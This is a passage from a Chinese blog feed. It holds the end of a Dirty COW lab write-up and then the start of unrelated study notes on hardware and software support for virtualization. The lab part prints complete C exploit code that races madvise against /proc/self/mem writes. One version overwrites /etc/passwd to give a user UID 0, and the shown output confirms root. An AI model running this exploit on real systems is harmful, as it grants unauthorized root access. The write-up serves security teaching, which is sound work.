class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">void</span> *<span class="hljs-built_in">map</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">writeThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">madviseThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">pthread_t</span> pth1,pth2;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>  <span class="hljs-keyword">int</span> file_size;<br><br>  <span class="hljs-comment">// Open the target file in the read-only mode.</span><br>  <span class="hljs-keyword">int</span> f=open(<span class="hljs-string">&quot;/zzz&quot;</span>, O_RDONLY);<br><br>  <span class="hljs-comment">// Map the file to COW memory using MAP_PRIVATE.</span><br>  fstat(f, &amp;st);<br>  file_size = st.st_size;<br>  <span class="hljs-built_in">map</span>=mmap(<span class="hljs-literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="hljs-number">0</span>);<br><br>  <span class="hljs-comment">// Find the position of the target area</span><br>  <span class="hljs-keyword">char</span> *position = <span class="hljs-built_in">strstr</span>(<span class="hljs-built_in">map</span>, <span class="hljs-string">&quot;222222&quot;</span>);                        <br><br>  <span class="hljs-comment">// We have to do the attack using two threads.</span><br>  pthread_create(&amp;pth1, <span class="hljs-literal">NULL</span>, madviseThread, (<span class="hljs-keyword">void</span>  *)file_size); <br>  pthread_create(&amp;pth2, <span class="hljs-literal">NULL</span>, writeThread, position);             <br><br>  <span class="hljs-comment">// Wait for the threads to finish.</span><br>  pthread_join(pth1, <span class="hljs-literal">NULL</span>);<br>  pthread_join(pth2, <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">writeThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *content= <span class="hljs-string">&quot;******&quot;</span>;<br>  <span class="hljs-keyword">off_t</span> offset = (<span class="hljs-keyword">off_t</span>) arg;<br><br>  <span class="hljs-keyword">int</span> f=open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-comment">// Move the file pointer to the corresponding position.</span><br>    lseek(f, offset, SEEK_SET);<br>    <span class="hljs-comment">// Write to the memory.</span><br>    write(f, content, <span class="hljs-built_in">strlen</span>(content));<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">madviseThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> file_size = (<span class="hljs-keyword">int</span>) arg;<br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>      madvise(<span class="hljs-built_in">map</span>, file_size, MADV_DONTNEED);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简要分析一下上面的代码逻辑：</p><ul><li></li></ul><p>编译并运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc cow_attack.c -lpthread</span><br><span class="hljs-meta">$</span><span class="bash"> a.out</span><br><span class="hljs-meta">$</span><span class="bash"> cat /zzz</span><br>111111******333333<br></code></pre></td></tr></table></figure><p>发现文件内容已经被更改</p><h1 id="攻击-etc-passwd-以获得特权"><a href="#攻击-etc-passwd-以获得特权" class="headerlink" title="攻击/etc/passwd 以获得特权"></a>攻击/etc/passwd 以获得特权</h1><p><code>/etc/passwd</code>文件包含七个冒号分隔的字段，第三个字段指定分配给用户的(UID)值，任何UID为0的用户都被系统视为 root 用户，此阶段我们的任务是利用脏牛漏洞来实现提权，也即是将第三个字段从1001改为0000</p><p>增加Charlie用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo adduser charlie</span><br><span class="hljs-meta">$</span><span class="bash"> cat /etc/passwd | grep charlie</span><br>charlie:x:1001:1002:,,,:/home/charlie:/bin/bash<br></code></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">void</span> *<span class="hljs-built_in">map</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">writeThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">madviseThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">pthread_t</span> pth1,pth2;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>  <span class="hljs-keyword">int</span> file_size;<br><br>  <span class="hljs-comment">// Open the target file in the read-only mode.</span><br>  <span class="hljs-keyword">int</span> f=open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br><br>  <span class="hljs-comment">// Map the file to COW memory using MAP_PRIVATE.</span><br>  fstat(f, &amp;st);<br>  file_size = st.st_size;<br>  <span class="hljs-built_in">map</span>=mmap(<span class="hljs-literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="hljs-number">0</span>);<br><br>  <span class="hljs-comment">// Find the position of the target area</span><br>  <span class="hljs-keyword">char</span> *position = <span class="hljs-built_in">strstr</span>(<span class="hljs-built_in">map</span>, <span class="hljs-string">&quot;1001:1002&quot;</span>);                        <br><br>  <span class="hljs-comment">// We have to do the attack using two threads.</span><br>  pthread_create(&amp;pth1, <span class="hljs-literal">NULL</span>, madviseThread, (<span class="hljs-keyword">void</span>  *)file_size); <br>  pthread_create(&amp;pth2, <span class="hljs-literal">NULL</span>, writeThread, position);             <br><br>  <span class="hljs-comment">// Wait for the threads to finish.</span><br>  pthread_join(pth1, <span class="hljs-literal">NULL</span>);<br>  pthread_join(pth2, <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">writeThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *content= <span class="hljs-string">&quot;0000:1002&quot;</span>;<br>  <span class="hljs-keyword">off_t</span> offset = (<span class="hljs-keyword">off_t</span>) arg;<br><br>  <span class="hljs-keyword">int</span> f=open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-comment">// Move the file pointer to the corresponding position.</span><br>    lseek(f, offset, SEEK_SET);<br>    <span class="hljs-comment">// Write to the memory.</span><br>    write(f, content, <span class="hljs-built_in">strlen</span>(content));<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">madviseThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> file_size = (<span class="hljs-keyword">int</span>) arg;<br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>      madvise(<span class="hljs-built_in">map</span>, file_size, MADV_DONTNEED);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译、运行</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe">$gcc <span class="hljs-keyword">new</span><span class="hljs-type">_cow</span>.c -lpthread -o <span class="hljs-keyword">new</span><span class="hljs-type"></span><br>$./<span class="hljs-keyword">new</span><span class="hljs-type"></span><br></code></pre></td></tr></table></figure><p>然后我们可以查看/etc/passwd文件中关于Charlie的东西：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">charlie:</span><span class="hljs-symbol">x:</span>0000<span class="hljs-symbol">:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/charlie</span><span class="hljs-symbol">:/bin/bash</span><br></code></pre></td></tr></table></figure><p>第三个条目已经成功修改为了0000</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># id</span><br><span class="hljs-attribute">uid</span>=0(root) <span class="hljs-attribute">gid</span>=1002(charlie) <span class="hljs-attribute">groups</span>=0(root),1002(charlie)<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c">https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hardware and Software Support for Virtualization 学习笔记</title>
    <link href="/p/12488d05/"/>
    <url>/p/12488d05/</url>
    
    <content type="html"><![CDATA[<h1 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h1><p>本章介绍了虚拟化、虚拟机和虚拟机监视器的基本概念，因为各种文章、教科书和商业产品描述有时会使用相互冲突的定义。</p><ul><li>虚拟化是通过强制模块化应用分层原则，即公开的虚拟资源与被虚拟化的底层物理资源相同。</li><li>虚拟机是一个完整的计算环境的抽象，通过对计算机的处理器、内存和 I/O 组件进行组合虚拟化。</li><li>hypervisor 是一个管理和运行虚拟机的专用系统软件。</li><li>虚拟机监视器(VMM)是指管理程序中专注于 CPU 和内存虚拟化的部分。</li></ul><h2 id="1-1-虚拟化（virtualization）"><a href="#1-1-虚拟化（virtualization）" class="headerlink" title="1.1 虚拟化（virtualization）"></a>1.1 虚拟化（virtualization）</h2><p>定义是以计算机系统的两个基本原理为基础的。</p><p>首先，分层是单个抽象的表示，通过添加一个间接层来实现，当(i)间接依赖于单个较低层和(ii)使用定义良好的名称空间来公开抽象时。其次，强制的模块化还保证了层的客户端不能绕过抽象层，例如直接访问物理资源或对底层物理名称空间的使用具有可见性。因此，虚拟化只不过是一个分层实例，其公开的抽象与底层物理资源等价。是间接性、强制模块化和兼容性的结合，是降低计算机系统复杂性和简化操作的特别强大的方法。</p><p>以 RAID 的经典示例为例。RAID是一种磁盘阵列技术，将多个廉价的物理硬盘组合成一个虚拟磁盘，提供冗余和性能增强的存储解决方案。在这个例子中，虚拟化的思想是将多个物理硬盘抽象为一个单一的虚拟磁盘，使文件系统可以像访问单个硬盘一样访问这个虚拟磁盘。</p><ol><li><strong>RAID示例</strong>：RAID是一种典型的虚拟化技术示例。它将多个物理硬盘组合在一起，以提供性能和冗余。虚拟化的概念在这里体现在将多个硬盘抽象为一个虚拟磁盘，因此文件系统不需要知道它们是物理硬盘。</li><li><strong>接口的兼容性</strong>：虚拟磁盘和物理硬盘都遵循相同的块设备接口，这意味着文件系统可以以相同的方式与它们进行交互。这种兼容性使得无论RAID层是否存在，文件系统的部署方式都可以保持不变。</li><li><strong>物理地址的隐藏</strong>：RAID层在内部管理磁盘资源，隐藏了物理地址的细节。这意味着文件系统可以透明地将数据存储在虚拟磁盘上，无需关心底层物理硬盘的位置。这种抽象简化了操作，特别是在硬盘故障时需要替换物理硬盘时。</li></ol><p>计算机体系结构中的虚拟化: 虚拟化显然是计算机体系结构的基本组成部分。通过内存管理单元(MMU)公开的虚拟内存就是一个典型的例子: MMU 增加了一个间接级别，通常通过分段和分页机制的组合来隐藏应用程序的物理地址。由于 MMU 控制操作仅限于内核模式，因此强化了模块化。</p><p><strong>1. 虚拟化的基本原理</strong><br>虚拟化是计算机体系结构的重要组成部分，它旨在提供一种抽象层，使硬件资源能够被多个应用程序或系统共享，同时保障安全性和隔离性。其中一个经典的虚拟化示例是通过内存管理单元（MMU）实现的虚拟内存。MMU引入了一个额外的间接级别，通过分段和分页机制，将应用程序的物理内存地址映射到虚拟内存地址。这种技术有助于增强模块化，因为操作系统可以有效地管理和隔离不同应用程序的内存空间，使它们似乎在独立的地址空间中运行。</p><p><strong>2. 操作系统中的虚拟化</strong><br>虚拟化的概念也广泛应用于操作系统。操作系统的主要任务之一是为多个并发应用程序提供安全且隔离的访问计算机资源，如CPU、内存和I/O设备。例如，操作系统通过控制MMU来确保不同的进程具有孤立的地址空间，使它们无法相互干扰。此外，操作系统可以在物理CPU核心上透明地调度多个线程，以充分利用有限的CPU资源，这也是虚拟化的一种形式。此外，操作系统还将多个不同的文件系统整合到一个虚拟名称空间中，使用户能够方便地管理和访问文件。</p><p><strong>3. I/O子系统中的虚拟化</strong><br>虚拟化还广泛应用于I/O子系统，包括磁盘和磁盘控制器。在这个领域，虚拟化的概念涉及到块级别的数据访问。例如，RAID（冗余独立磁盘阵列）控制器和存储阵列使用虚拟化来将多个虚拟磁盘的抽象呈现给操作系统，同时将它们实际上作为物理磁盘进行处理。这种虚拟化技术有助于提供数据冗余和性能优化。类似地，现代固态硬盘（SSD）中的Flash转换层在I/O子系统中提供了磨损均衡，并将SSD呈现给操作系统，就像它是一个传统的机械硬盘一样。这种虚拟化层使操作系统能够有效地管理SSD的使用，并提供更高的性能和耐久性。</p><p><img src="https://img.gls.show/img/20230901154605.png"></p><p><strong>1. 多路复用（Multiplexing）</strong> 多路复用是一种技术，它允许多个虚拟实体共享同一资源。这可以在空间和时间两个方面实现。在空间多路复用中，物理资源（如内存页）被划分为多个虚拟实体，以便多个应用程序可以同时访问它们。在时间多路复用中，相同的物理资源会在不同虚拟实体之间进行临时调度，使它们能够轮流使用资源。例如，操作系统调度程序将 CPU 核心和硬件线程在一组可运行进程之间进行多路复用。上下文切换操作将处理器的寄存器文件保存在与传出进程关联的内存中，然后从与传入进程关联的内存位置恢复寄存器文件的状态。例如，操作系统跨不同的地址空间多路复用不同的物理内存页。为了实现这个目标，操作系统管理虚拟到物理的映射，并依赖于 MMU 提供的架构支持。<br><strong>2. 聚合（Aggregation）</strong> 聚合是指将多个物理资源组合成一个单一的抽象资源。这意味着多个物理资源被汇总在一起，以形成一个更大或更复杂的资源。例如，RAID（冗余独立磁盘阵列）控制器将多个硬盘聚合成一个卷，从而提供了冗余和性能优化。聚合后，所有对卷的读写操作都会被适当地反映在底层的物理磁盘上。<br><strong>3. 模拟（Emulation）</strong> 模拟是通过软件中的间接级别来模仿物理资源或设备的技术。这意味着虚拟资源或设备可以在当前计算机系统中并不存在的情况下被模拟出来。例如，跨架构模拟器可以在一种处理器架构上模拟另一种处理器架构，以实现向下兼容性。这种技术使得在不同的硬件或软件环境中运行应用程序成为可能。<br><strong>多路复用、聚合和模拟</strong>三种技术通常可以自然地结合在一起，形成一个完整的虚拟化执行堆栈。例如，在虚拟机监视器（VM）中，多路复用和模拟通常一起使用。VM可以多路复用多个虚拟机实例在同一物理服务器上运行，同时通过模拟提供对虚拟资源的访问，使虚拟机实例似乎拥有自己的独立资源。</p><h2 id="1-2-虚拟机"><a href="#1-2-虚拟机" class="headerlink" title="1.2 虚拟机"></a>1.2 虚拟机</h2><p>虚拟机是一个完整的计算环境，具有独立的处理能力、内存和通信通道。</p><p>基于语言的虚拟机，例如 Java 虚拟机、微软通用语言运行库、嵌入浏览器的 Javascript 引擎，以及一般来说任何托管语言的运行时环境。这些运行时环境关注于运行单个应用程序，并不在本书的范围之内; </p><p>轻量级虚拟机，它依赖于硬件和软件隔离机制的组合，以确保直接在处理器上运行的应用程序(例如，作为本地 x86代码)与其他沙箱和底层操作系统安全隔离。Is 包括以服务器为中心的系统，如 Denali [182] ，以及以桌面为中心的系统，如 Google Native Client [190]和 Vx32[71]。</p><ol><li><strong>Vx32</strong>：类似于Google Native Client的系统，旨在提供桌面系统中的本机代码执行的安全性和隔离。</li><li><strong>Google Native Client</strong>：这是一个用于桌面系统的技术，允许在Web浏览器中运行本机代码，同时提供了安全性隔离，以防止恶意代码对系统造成损害。</li></ol><p>基于 Linux 容器的解决方案，如 Docker [129]或相应的 FreeBSD Jail [110] ，也属于同一类别。</p><p>系统级虚拟机，其中独立的计算环境类似于计算机的硬件，因此虚拟机可以运行一个标准的、商品化的操作系统及其应用程序，与其他虚拟机和环境的其他部分完全隔离。这种虚拟机将虚拟化原理应用于整个计算机系统。每个虚拟机都有自己的底层硬件副本，或者至少有自己的底层硬件副本。每个虚拟机都运行自己独立的操作系统实例，称为来宾操作系统。是这本书的重点。</p><p><img src="https://img.gls.show/img/20230901155948.png"></p><p>图1.2还对运行系统级虚拟机的各种平台进行了分类。我们将这些平台称为系统管理程序或机器模拟器，具体取决于运行虚拟机所使用的技术:<br>系统管理程序依赖于 CPU 上的直接执行以获得最大效率，理想情况下可以完全消除性能开销。在直接执行时，系统管理程序设置硬件环境，然后让虚拟机指令直接在处理器上执行。由于这些指令序列必须在虚拟机的抽象中操作，它们的执行会导致陷阱，虚拟机监控程序必须模拟这些陷阱。</p><p>机器模拟器通常作为一个普通的用户级应用程序来实现，目标是提供一个精确的虚拟化架构模拟，并且经常以本机速度的一小部分运行，从5x减速到1000x，这取决于模拟细节的级别。机器模拟器在计算机体系结构中起着基础性的作用，它允许对复杂的工作负载进行详细的体系结构研究。</p><h2 id="1-3-系统管理程序"><a href="#1-3-系统管理程序" class="headerlink" title="1.3 系统管理程序"></a>1.3 系统管理程序</h2><p>系统管理程序是一种特殊形式的系统软件，它运行虚拟机，以最小化执行开销为目标。当多个虚拟机在同一计算机系统上同时共存时，虚拟机监控程序会在虚拟机之间适当地分配和调度物理资源。Popek 和 Goldberg 在1974年正式确定了虚拟机和 hypervisor (他们称之为 VMM)之间的关系，如下所示[143]。</p><blockquote><p>虚拟机被认为是真实机器的有效的、孤立的复制品。我们通过虚拟机监视器(VMM)的概念来解释这些概念。作为软件的一部分，VMM 具有三个基本特征。首先，VMM 为程序提供了一个与原始机器基本相同的环境; 其次，在这个环境中运行的程序在最坏的情况下只显示速度的轻微下降; 最后，VMM 完全控制系统资源。</p></blockquote><p>Popek 和 Goldberg 的定义与更广泛的虚拟化定义是一致的: 管理程序将分层原则应用于计算机，并具有三个特定的标准: 等价性、安全性和性能。</p><p>等价性: 复制确保公开的资源(即虚拟机)与底层计算机等价。是一个强大的需求，当体系结构需要它时，它在某种程度上被放宽了(见1.7)。</p><blockquote><p><strong>复制（Duplication）</strong>：在虚拟化中，复制指的是虚拟机与底层物理计算机之间的等效性。这意味着虚拟机应该在操作和性能方面表现得像底层物理计算机一样，以便应用程序不需要关心它们是否在虚拟环境中运行。这种等效性是虚拟化技术的一个核心目标。</p></blockquote><p>安全性: 隔离要求虚拟机彼此之间以及虚拟机监控程序之间都是隔离的，这强制了系统的模块性。至关重要的是，系统管理程序强制执行设计的安全性，而不对运行在虚拟机(包括客户操作系统)中的软件做任何假设。</p><p>性能: 最后，也是最关键的一点，Popek 和 Goldberg 的定义增加了一个额外的要求: 虚拟系统必须在最坏的情况下显示速度的轻微下降。是将虚拟机监控程序与机器<strong>模拟器</strong>分离的最终要求。尽管机器模拟器也满足复制和隔离标准，但它们不符合效率标准，因为<strong>即使是使用动态二进制转换的快速机器模拟器</strong>[32,124,153,184]也将目标系统的执行速度至少减慢了5x，这在很大程度上是因为在软件中模拟虚拟机的 TLB 的成本很高。</p><h2 id="1-4-TYPE-1-AND-TYPE-2-HYPERVISORS"><a href="#1-4-TYPE-1-AND-TYPE-2-HYPERVISORS" class="headerlink" title="1.4 TYPE-1 AND TYPE-2 HYPERVISORS"></a>1.4 TYPE-1 AND TYPE-2 HYPERVISORS</h2><p>系统管理程序体系结构可以分为所谓的 type-1和 type-2。罗伯特 · 戈德堡在他的论文[77]中介绍了这些术语，自那以后这些术语一直被使用。非正式地，type-1管理程序直接控制物理计算机的所有资源。相比之下，type-2虚拟机监控程序可以“作为”现有主机操作系统的一部分或“在”现有主机操作系统的“上面”操作。遗憾的是，文献中对这些定义的应用比较松散，导致了一些混乱。Goldberg 的定义(使用更新的术语)如下：</p><ul><li>虚拟化的一个基本要求，即虚拟机中的指令应该直接在主机硬件上执行，而不需要进行额外的解释或翻译。这有助于确保虚拟机的性能接近于运行在裸机上的原生应用程序。</li><li><strong>Type-1和Type-2 VMM</strong>：<ul><li><strong>Type-1 VMM</strong>：这种类型的VMM运行在裸机上，直接与硬件交互，<strong>负责执行系统的调度和资源分配</strong>。Type-1 VMM通常需要更高的特权级别，并可能包含一些虚拟化不需要的额外代码，因为它要负责管理整个物理主机。在服务器虚拟化中常见，因为它们通常提供更好的性能和隔离，适用于云计算环境。</li><li><strong>Type-2 VMM</strong>：运行在主机操作系统下的虚拟机监视器。虚拟机的资源分配和环境创建更清晰地与主机操作系统分离。<strong>主机操作系统负责正常的系统资源分配</strong>，而Type-2 VMM提供标准的扩展虚拟机环境。通常用于桌面虚拟化，因为它们更容易设置和管理，但性能通常较差。包括VMware Workstation、KVM、VirtualBox等</li></ul></li></ul><p>我们注意到，重点在于资源分配，而不是管理程序是以特权模式还是非特权模式运行。特别是，即使系统管理程序以内核模式运行，例如 Linux/kVM 和 VMware Workstation ，它也可以是 type-2。事实上，Goldberg 假设系统管理程序总是使用管理程序特权执行。这两种类型在当前系统中都很常见。首先，VMware ESX Server [177]、 Xen [27,146]和微软Hyper-V都是 type-1 hypervisor。即使 Xen 和 Hyper-V 依赖于一个名为 dom0的主机环境，系统管理程序本身也会做出资源分配和调度决策。VMware Workstation、 VMware Fusion、 KVM、 Microsoft Virtu-alPC、 Parallels 和 Oracle VirtualBox 都是 type-2 hypervisor。它们与主机操作系统协作，以便主机操作系统调度所有系统资源。主机操作系统像调度进程一样调度系统管理程序，即使这些系统都依赖于大量的内核模式组件来执行虚拟机。一些系统管理程序，如 VMware Workstation 和 Oracle VirtualBox，可以在不同的主机操作系统上移植，而 Fusion 和 Parallels 可以在 Mac OS X 主机操作系统上运行，Microsoft Virtual PC 可以在 Windows 主机操作系统上运行，而 KVM 可以作为 Linux 主机操作系统的一部分运行。在这些 type-2系统中，KVM 提供了与主机操作系统的最佳集成，因为系统管理程序的内核模式组件作为内核模块直接集成在 Linux 主机中。</p><p><strong>关注点在于资源分配</strong>：在虚拟化中，关键问题之一是如何分配和管理物理主机上的资源，包括处理器时间、内存、存储等。这决定了虚拟机的性能和隔离程度。因此，虚拟化的一个主要焦点是<strong>资源分配策略</strong>，而不仅仅是管理程序运行在特权模式还是非特权模式。</p><p>一些虚拟化系统，如VMware ESX Server和Xen，即使依赖于主机环境（如dom0），也被认为是Type-1 Hypervisor，因为它们自己负责资源分配和调度</p><h2 id="1-5-一个主机管理程序的概览-多路复用与仿真"><a href="#1-5-一个主机管理程序的概览-多路复用与仿真" class="headerlink" title="1.5 一个主机管理程序的概览: 多路复用与仿真"></a>1.5 一个主机管理程序的概览: 多路复用与仿真</h2><p>随着基本定义的建立，我们现在进入虚拟化计算机系统关键元素的第一个SKETCH，即虚拟机的规范和虚拟机监控程序的基本构造块。</p><p>图1.3说明了虚拟化计算机系统的关键架构组件。图中显示了三个虚拟机，每个虚拟机都有自己的<strong>虚拟硬件</strong>、自己的<strong>客户操作系统</strong>和自己的<strong>应用程序</strong>。</p><p>系统管理程序<strong>控制实际的物理资源并直接在硬件上运行</strong>。在这种简化的体系结构中，硬件(虚拟或物理)由处理元素组成，这些处理元素包括一个或多个 <strong>CPU、它们的 MMU 和缓存一致性内存</strong>。电子处理元件连接到一个 I/O 总线，带有两个附加的 I/O 设备: 一个磁盘和一个网络接口卡，如图1.3所示。是<strong>服务器部署的代表</strong>。桌面平台将包括额外的设备，如键盘、视频、鼠标、串行端口、 USB 端口等。移动平台可能还需要 GPS、加速度计和无线电。在其最基本的形式中，<strong>虚拟机监控程序使用1.1的三种关键虚拟化技术中的两种</strong>: 它(在空间中，可能在时间中)跨虚拟机<strong>多路复用</strong>物理 PE，并且它<strong>模拟</strong>其他所有东西，特别是 I/O 总线和 I/O 设备。技术的结合在实践中既是必要的，也是充分的，以达到效率标准。这是必要的，因为如果没有有效的机制来复用 CPU 和 MMU，系统管理程序将不得不模拟虚拟机的执行。事实上，机器模拟器和 hypervisor 之间的主要区别在于，<strong>前者模拟虚拟机的指令集架构，而后者复用虚拟机</strong>。CPU 的多路复用是一个调度任务，非常类似于操作系统执行的调度进程的任务。调度实体(这里是 hypervisor)设置硬件环境(注册文件等) ，然后让被调度实体(虚拟机)直接在硬件上运行，减少权限。</p><p><img src="https://img.gls.show/img/20230901175512.png"></p><p>这种调度技术称为直接执行，因为管理程序允许虚拟 CPU 直接执行实际处理器上的指令。当然，系统管理程序还负责确保虚拟机的安全性。因此，它确保虚拟 CPU 